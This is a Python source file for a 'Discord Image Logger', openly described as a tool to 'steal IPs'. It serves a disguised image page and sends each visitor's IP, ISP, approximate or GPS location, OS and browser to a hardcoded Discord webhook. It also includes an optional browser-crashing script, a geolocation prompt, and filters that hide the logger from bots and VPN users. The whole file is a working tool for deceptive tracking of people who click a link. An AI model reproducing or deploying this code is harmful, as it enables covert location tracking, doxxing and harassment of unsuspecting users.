
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1342445465819414578/9KjRHH3Y6pEAVWUh1kRWnkASo3DkAIFspOns8AmmC60WWyM6guLG85Fz7wms4NfBhFj5",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
